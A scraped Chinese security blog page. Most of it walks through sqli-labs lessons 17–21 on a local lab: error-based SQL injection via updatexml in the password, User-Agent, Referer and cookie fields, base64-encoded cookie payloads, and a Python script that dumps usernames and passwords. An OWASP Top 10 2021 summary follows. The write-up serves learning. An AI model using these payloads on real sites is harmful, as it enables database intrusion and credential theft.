<p><code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
<p>我想用同样的方法利用<code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#</code>取字段，却返回了</p>
<p><code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p>这是因为不能依据某字段值做判断再来更新某字段的值。</p>
<p>百度的方法是把查询结果作为中间表，然后再查询一边中间表作为结果。</p>
<p>所以先查一边作为中间表 </p>
<p><code>(SELECT username from users limit 0,1) as a</code></p>
<p>然后进行再查中间表得到</p>
<p><code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT username  from (SELECT username from users limit 0,1) as a limit 0,1),0x7e),1)#</code></p>
<p>（上面的payload中，可以直接改username为password取密码，然后limit 改一下取不同字段的。爆破一下就出来了）</p>
<p>回显</p>
<p><code>XPATH syntax error: &#39;~Dumb~&#39;</code></p>
<p>下面是我自己随便写的脚本，用来取username和password的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-17/&quot;</span><br><span class="line"></span><br><span class="line">for i in range(15):</span><br><span class="line">    data = &#123;&#x27;uname&#x27;: &quot;admin&quot;, &#x27;passwd&#x27;: &quot;1&#x27; and updatexml(1,concat(0x7e,(SELECT username from (SELECT username from users &quot;</span><br><span class="line">                                    &quot;limit %d,1) as a limit 0,1),0x7e),1)#&quot;%i&#125;</span><br><span class="line">    respond = requests.post(url, data)</span><br><span class="line">    s=re.findall(r&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;XPATH syntax error: \&#x27;~(.+)~\&#x27;&#x27;,respond.text)</span><br><span class="line">    print(s)</span><br><span class="line">for i in range(15):</span><br><span class="line">    data = &#123;&#x27;uname&#x27;: &quot;admin&quot;, &#x27;passwd&#x27;: &quot;1&#x27; and updatexml(1,concat(0x7e,(SELECT password from (SELECT password from users &quot;</span><br><span class="line">                                    &quot;limit %d,1) as a limit 0,1),0x7e),1)#&quot;%i&#125;</span><br><span class="line">    respond = requests.post(url, data)</span><br><span class="line">    s=re.findall(r&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;XPATH syntax error: \&#x27;~(.+)~\&#x27;&#x27;,respond.text)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>

<h2 id="Less-18-POST-基于报错的uagent处的头部注入"><a href="#Less-18-POST-基于报错的uagent处的头部注入" class="headerlink" title="Less-18 POST-基于报错的uagent处的头部注入"></a>Less-18 POST-基于报错的uagent处的头部注入</h2><p>我们先测试随便post些东西，然后会返回你的ip地址。可以发现这题的回显在ip了 </p>
<p>直接看源码吗，发现uname和passwd都进行了过滤，但是出现了有个uagent</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">	if($row1)</span><br><span class="line">		&#123;</span><br><span class="line">		echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;;</span><br><span class="line">		$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>

<p>我们要先保证输入的账号密码是正确的，然后可以返回<code>User-Agent</code>，因此这题的注入点就在<code>User-Agent</code>。</p>
<p>我们通过brupsuite进行抓包，将<code>User-Agent</code>结尾加上<code>&#39;</code>发现会报错，因此可以在该处进行sql注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&#x27;</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>根据返回的进行判断，返回了一个<code>INSEERT INTO table VALUES(&#39;User-Agent&#39;,&#39;Ip&#39;,&#39;Username&#39;)</code></p>
<p>我们可以构造一个<code>User-Agent=1&#39;,1,1)#</code>进行绕过，返回了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your User Agent is: 1&#x27;,1,1)#</span><br></pre></td></tr></table></figure>

<p>然后我们就可以同样利用<code>updatexml()</code>进行注入</p>
<p>构造<code>User-Agent:1&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#</code>，回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your User Agent is: 1&#x27;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>

<p>得到了数据库，因此同样可以以17题方法进行查询</p>
<p>取表</p>
<p><code>User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1))#</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>

<p>取列</p>
<p><code>User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1))#</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>

<p>取字段</p>
<p><code>User-Agent:1&#39;,1,updatexml(1,concat(0x7e,(select concat(username,&#39;~&#39;,password) from users limit 0,1),0x7e),1))#</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~Dumb~Dumb~&#x27;</span><br></pre></td></tr></table></figure>

<p>然后可以一个一个用bp爆破的找了</p>
<h2 id="Less-19-POST-基于报错的refer处的头部注入"><a href="#Less-19-POST-基于报错的refer处的头部注入" class="headerlink" title="Less-19 POST-基于报错的refer处的头部注入"></a>Less-19 POST-基于报错的refer处的头部注入</h2><p>与18题类似，先看一下源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		if($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;;</span><br><span class="line">			$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">			mysql_query($insert);</span><br></pre></td></tr></table></figure>

<p>这里的会返回uagent和ip的值，因此我们同样先在referer后面加上<code>&#39;</code>，然后看报错，判断发现存在报错信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://127.0.0.1/sqli-labs-master/Less-19/&#x27;</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>返回了一个<code>INSEERT INTO table VALUES(&#39;referer&#39;,&#39;Ip&#39;)</code></p>
<p>因此我们可以构造一个<code>referer=1&#39;,1)#</code>绕过</p>
<p>接下来就一样方法取了。</p>
<p><code>Referer:1&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</code> 取数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Referer:1&#39;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)) #</code>  取表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Referer:1&#39;,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)) #</code> 取列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Referer:1&#39;,updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e),1)) #</code>  取字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~Dumb~Dumb~&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Less-20-POST-基于报错的uagent处的Cookie注入"><a href="#Less-20-POST-基于报错的uagent处的Cookie注入" class="headerlink" title="Less-20 POST-基于报错的uagent处的Cookie注入"></a>Less-20 POST-基于报错的uagent处的Cookie注入</h2><p>同样输入admin和admin进行验证，发现会返回一系列的数值，其中包含了cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">YOUR IP ADDRESS IS : 127.0.0.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE </span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 23 Jan 2022 - 15:07:05</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:admin</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure>

<p>然后我们查看源码发现，在读cookie的 时候没有经过很严格的过滤，并且进行了二次调用，因此我们可以在cookie处进行二次注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[&#x27;uname&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>先利用<code>Cookie: uname=admin&#39; or 1=1#</code>发现可以进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">YOUR IP ADDRESS IS : 127.0.0.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE </span><br><span class="line">YOUR COOKIE : uname = admin&#x27; or 1=1# and expires: Sun 23 Jan 2022 - 15:12:11</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br><span class="line">Your ID:1</span><br></pre></td></tr></table></figure>

<p>然后就可以开始用updatexml进行注入。</p>
<p>取数据库</p>
<p><code>Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select database()),0x7e),0x7e)#</code> </p>
<p>取表</p>
<p><code>Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e),0x7e)#</code></p>
<p>取列</p>
<p><code>Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&#39;users&#39;),0x7e),0x7e)#</code></p>
<p>取字段</p>
<p><code>Cookie: uname=admin&#39; or updatexml(0x7e,concat(0x7e,(select concat(0x7e,username,0x7e,password,0x7e) from users limit 0,1),0x7e),0x7e)#</code></p>
<p>（此处同样可以爆破）</p>
<h2 id="Less-21-POST-Cookie注入-base64加密-单引号"><a href="#Less-21-POST-Cookie注入-base64加密-单引号" class="headerlink" title="Less-21 POST-Cookie注入-base64加密-单引号"></a>Less-21 POST-Cookie注入-base64加密-单引号</h2><p>用admin进行测试，发现会回显<code>uname = YWRtaW4=</code>这个是admin的base64格式。</p>
<p>我们通过观察一下源码，发现在源码中，先对uname进行base64加密，然后在后面，在对其解密，其中没有经过过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600);</span><br><span class="line">*****</span><br><span class="line">echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line">$cookee = base64_decode($cookee);</span><br></pre></td></tr></table></figure>

<p>因此我们在抓包修改cookie进行注入的时候，可以先把payload进行base64，然后成功读入后，在被解的时候，可以返回报错信息，实现注入。</p>
<p>由于base64编码中#有问题，所以我用了<code>and ’1‘=’1</code>进行绕过</p>
<p>先取数据库</p>
<p><code>Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ==</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>

<p>取表</p>
<p><code>Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9InNlY3VyaXR5IiksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ==</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>

<p>取列</p>
<p><code>Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0ic2VjdXJpdHkiIGFuZCB0YWJsZV9uYW1lPSd1c2VycycpLDB4N2UpLDB4N2UpIGFuZCAnMSc9JzE=</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>

<p>取字段</p>
<p><code>Cookie:uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgweDdlLGNvbmNhdCgweDdlLChzZWxlY3QgY29uY2F0KDB4N2UsdXNlcm5hbWUsMHg3ZSxwYXNzd29yZCwweDdlKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSksMHg3ZSksMHg3ZSkgYW5kICcxJz0nMQ==</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~~Dumb~Dumb~~&#x27;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/2021%E7%89%88OWASP-TOP-10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="10vexh">
      <meta itemprop="description" content="水至清则无鱼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="good good study,day day up.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/2021%E7%89%88OWASP-TOP-10/" class="post-title-link" itemprop="url">2021版OWASP TOP 10</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-02 21:15:03 / 修改时间：22:06:43" itemprop="dateCreated datePublished" datetime="2022-01-02T21:15:03+08:00">2022-01-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2021版OWASP-TOP-10"><a href="#2021版OWASP-TOP-10" class="headerlink" title="2021版OWASP TOP 10"></a>2021版OWASP TOP 10</h1><h2 id="Top1-Broken-Access-Control-失效的访问控制"><a href="#Top1-Broken-Access-Control-失效的访问控制" class="headerlink" title="Top1 Broken Access Control 失效的访问控制"></a>Top1 <strong>Broken Access Control 失效的访问控制</strong></h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>​        就是所谓的越权漏洞，未经过身份验证的用户，通过该漏洞访问未经授权的功能和数据。例如，获取他人的数据信息，修改他人的数据，访问权限等，都属于失效的访问控制所导致的后果。</p>
<p>常见的访问控制漏洞包括：</p>
<ol>
<li>通过修改 URL、内部应用程序状态或 HTML 页面，或仅使用自定义 API 攻击工具来绕过访问控制检查。</li>
<li>允许将主键更改为其他用户的记录，允许查看或编辑其他人的帐户。</li>
<li>特权提升。在未登录的情况下充当用户或以用户身份登录时充当管理员。</li>
<li>元数据操作，例如重放或篡改 JSON Web 令牌 (JWT) 访问控制令牌，或用于提升权限或滥用 JWT 失效的 cookie 或隐藏字段。</li>
<li>CORS 错误配置允许未经授权的 API 访问。</li>
<li>强制以未经身份验证的用户身份浏览经过身份验证的页面或以标准用户身份浏览特权页面。访问 API 时缺少对 POST、PUT 和 DELETE 的访问控制。</li>
</ol>
<h3 id="预防方式"><a href="#预防方式" class="headerlink" title="预防方式"></a>预防方式</h3><ol>
<li>除公共资源外，默认拒绝。</li>
<li>实施一次<strong>访问控制机制</strong>并在整个应用程序中重复使用它们，包括最大限度地减少 CORS 的使用。</li>
<li>模型访问控制应该强制记录所有权，而不是接受用户可以创建、读取、更新或删除任何记录。</li>
<li>独特的应用程序业务限制要求应由领域模型强制执行。</li>
<li>禁用 Web 服务器目录列表并确保文件元数据（例如 .git）和备份文件不在 Web 根目录中。</li>
<li>记录访问控制失败，在适当时提醒管理员（例如，重复失败）。</li>
<li>速率限制 API 和控制器访问，以最大限度地减少自动攻击工具的危害。</li>
<li>注销后，JWT 令牌应在服务器上失效。</li>
</ol>
<h3 id="攻击场景示例"><a href="#攻击场景示例" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景 #1：</strong>应用程序在访问帐户信息的 SQL 调用中使用未经验证的数据：</p>
<blockquote>
<p>pstmt.setString(1, request.getParameter(“acct”));</p>
<p>结果集结果 = pstmt.executeQuery();</p>
</blockquote>
<p>攻击者只需修改浏览器的“acct”参数即可发送他们想要的任何帐号。如果没有正确验证，攻击者可以访问任何用户的帐户。</p>
<p><a target="_blank" rel="noopener" href="https://example.com/app/accountInfo?acct=notmyacct">https://example.com/app/accountInfo?acct=notmyacct</a></p>
<p><strong>场景#2：</strong>攻击者只是强制浏览到目标 URL。访问管理页面需要管理员权限。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://example.com/app/getappInfo">https://example.com/app/getappInfo</a></p>
<p><a target="_blank" rel="noopener" href="https://example.com/app/admin_getappInfo">https://example.com/app/admin_getappInfo</a></p>
</blockquote>
<p>如果未经身份验证的用户可以访问任一页面，则这是一个缺陷。如果非管理员可以访问管理页面，这是一个缺陷。</p>
<h2 id="TOP2-Cryptographic-Failures-加密失败"><a href="#TOP2-Cryptographic-Failures-加密失败" class="headerlink" title="TOP2 Cryptographic Failures 加密失败"></a>TOP2 Cryptographic Failures 加密失败</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>​        就是俗称的敏感数据暴露，存在范围极大，重点在于加密算法存在的问题，是密码学范畴的失败。对于需要加密和加密传输的数据，需要进行额外的保护。</p>
<p>常见的有：</p>
<ol>
<li>是否有任何数据以明文形式传输？这涉及 HTTP、SMTP 和 FTP 等协议。外部互联网流量是危险的。验证所有内部流量，例如，负载平衡器、Web 服务器或后端系统之间的流量。</li>
<li>默认情况下或在较旧的代码中是否使用任何旧的或弱的加密算法？</li>
<li>是否正在使用默认加密密钥、生成或重复使用弱加密密钥，或者是否缺少适当的密钥管理或轮换？</li>
<li>是否未强制执行加密，例如，是否缺少任何用户代理（浏览器）安全指令或标头？</li>
<li>用户代理（例如，应用程序、邮件客户端）是否不验证收到的服务器证书是否有效？</li>
</ol>
<h3 id="预防方式-1"><a href="#预防方式-1" class="headerlink" title="预防方式"></a>预防方式</h3><p>至少执行以下操作，并查阅参考资料：</p>
<ol>
<li>对应用程序处理、存储或传输的数据进行分类。根据隐私法、监管要求或业务需求确定哪些数据是敏感的。</li>
<li>根据分类应用控制。</li>
<li>不要不必要地存储敏感数据。尽快丢弃它或使用符合 PCI DSS 的标记化甚至截断。未保留的数据不能被窃取。</li>
<li>确保加密所有静态敏感数据。</li>
<li>确保拥有最新且强大的标准算法、协议和密钥；使用适当的密钥管理。</li>
<li>使用安全协议（例如具有完美前向保密 (PFS) 密码的 TLS、服务器的密码优先级和安全参数）加密所有传输中的数据。使用 HTTP 严格传输安全 (HSTS) 等指令强制加密。</li>
<li>对包含敏感数据的响应禁用缓存。</li>
<li>使用具有工作因子（延迟因子）的强自适应和加盐散列函数存储密码，例如 Argon2、scrypt、bcrypt 或 PBKDF2。</li>
<li>独立验证配置和设置的有效性。</li>
</ol>
<h3 id="攻击场景示例-1"><a href="#攻击场景示例-1" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景#1</strong>：应用程序使用自动数据库加密对数据库中的信用卡号进行加密。但是，此数据在检索时会自动解密，从而允许 SQL 注入缺陷以明文形式检索信用卡号。</p>
<p><strong>场景#2</strong>：站点不使用或对所有页面强制执行 TLS 或支持弱加密。攻击者监视网络流量（例如，在不安全的无线网络中），将连接从 HTTPS 降级为 HTTP（<strong>使用sslstrip</strong>），拦截请求并窃取用户的会话 cookie。然后攻击者重放这个 cookie 并劫持用户的（经过身份验证的）会话，访问或修改用户的私人数据。除了上述之外，他们还可以更改所有传输的数据，例如，汇款的接收者。</p>
<p><strong>场景#3</strong>：密码数据库使用未加盐或简单的哈希来存储每个人的密码。文件上传缺陷允许攻击者检索密码数据库。所有未加盐的哈希值都可以通过预先计算的哈希值彩虹表公开。由简单或快速散列函数生成的散列可能会被 GPU 破解，即使它们被加盐。</p>
<h2 id="TOP3-Injection-注入"><a href="#TOP3-Injection-注入" class="headerlink" title="TOP3 Injection 注入"></a>TOP3 Injection 注入</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>最常见的就是sql注入，攻击者通过在web应用程序中事先定义好的查询语句结尾加上额外的sql语句，进而完成非法的操作</p>
<p>应用程序在以下情况下容易受到攻击：</p>
<ol>
<li>应用程序不会验证、过滤或清理用户提供的数据。</li>
<li>没有上下文感知转义的动态查询或非参数化调用直接在解释器中使用。</li>
<li>在对象关系映射 (ORM) 搜索参数中使用恶意数据来提取额外的敏感记录。</li>
<li>直接使用或连接恶意数据。SQL 或命令包含动态查询、命令或存储过程中的结构和恶意数据。</li>
</ol>
<p>一些更常见的注入是 SQL、NoSQL、OS 命令、对象关系映射 (ORM)、LDAP 和表达式语言 (EL) 或对象图导航库 (OGNL) 注入。这个概念在所有口译员中都是相同的。源代码审查是检测应用程序是否容易受到注入攻击的最佳方法。强烈建议对所有参数、标头、URL、cookie、JSON、SOAP 和 XML 数据输入进行自动化测试。组织可以将静态源 (SAST) 和动态应用程序测试 (DAST) 工具包含到 CI/CD 管道中，以在生产部署之前识别引入的注入缺陷。</p>
<h3 id="预防方式-2"><a href="#预防方式-2" class="headerlink" title="预防方式"></a>预防方式</h3><ol>
<li>防止注入需要将数据与命令和查询分开。</li>
<li>首选选项是使用安全的 API，它完全避免使用解释器，提供参数化接口，或迁移到对象关系映射工具 (ORM)。</li>
<li>注意：即使在参数化时，如果 PL/SQL 或 T-SQL 连接查询和数据或使用 EXECUTE IMMEDIATE 或 exec() 执行恶意数据，则存储过程仍然会引入 SQL 注入。</li>
<li>使用正面或“白名单”服务器端输入验证。这不是一个完整的防御，因为许多应用程序需要特殊字符，例如文本区域或移动应用程序的 API。</li>
<li>对于任何残留的动态查询，使用该解释器的特定转义语法转义特殊字符。</li>
<li>注意：表名、列名等 SQL 结构不能转义，因此用户提供的结构名是危险的。这是报告编写软件中的常见问题。</li>
<li>在查询中使用 LIMIT 和其他 SQL 控件以防止在 SQL 注入的情况下大量披露记录。</li>
</ol>
<h3 id="攻击场景示例-2"><a href="#攻击场景示例-2" class="headerlink" title="攻击场景示例"></a>攻击场景示例</h3><p><strong>场景 #1：</strong>应用程序在构建以下易受攻击的 SQL 调用时使用不受信任的数据：</p>
<blockquote>
<p>String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“;</p>
</blockquote>
<p><strong>场景#2：</strong>类似地，应用程序对框架的盲目信任可能会导致查询仍然存在漏洞（例如，Hibernate 查询语言 (HQL)）：</p>
<blockquote>
<p>Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“);</p>
</blockquote>
<p>在这两种情况下，攻击者都会修改浏览器中的 ‘id’ 参数值以发送：’ 或 ‘1’=’1。例如：</p>
<p><a target="_blank" rel="noopener" href="http://example.com/app/accountView?id=&#39;">http://example.com/app/accountView?id=&#39;</a> 或 ‘1’=’1</p>
<p>这将更改两个查询的含义以返回帐户表中的所有记录。更危险的攻击可能会修改或删除数据，甚至调用存储过程。</p>
<h2 id="TOP4-Insecure-Design-不安全的设计"><a href="#TOP4-Insecure-Design-不安全的设计" class="headerlink" title="TOP4 Insecure Design 不安全的设计"></a>TOP4 Insecure Design 不安全的设计</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>​        不安全设计是一个广泛的类别，代表许多不同的弱点，表现为“缺失或无效的控制设计”。无效的不安全设计可能会导致威胁的实现，比如在代码中存在漏洞的点容易被利用。</p>
<p>​        安全设计是一种方法，它不断评估威胁，经过测试避免已有的漏洞再次出现，防范已知的攻击手段。它需要安全的开发生命周期、某种形式的安全设计模式或铺砌道路组件库或工具，以及威胁建模。</p>
<h3 id="预防方式-3"><a href="#预防方式-3" class="headerlink" title="预防方式"></a>预防方式</h3><ol>
<li>与 AppSec 专业人员建立并使用安全的开发生命周期，以帮助评估和设计与安全和隐私相关的控制</li>
<li>建立和使用安全设计模式库或准备使用组件的铺好的道路</li>
<li>将威胁建模用于关键身份验证、访问控制、业务逻辑和关键流</li>
<li>编写单元和集成测试以验证所有关键流都能抵抗威胁模型</li>
</ol>
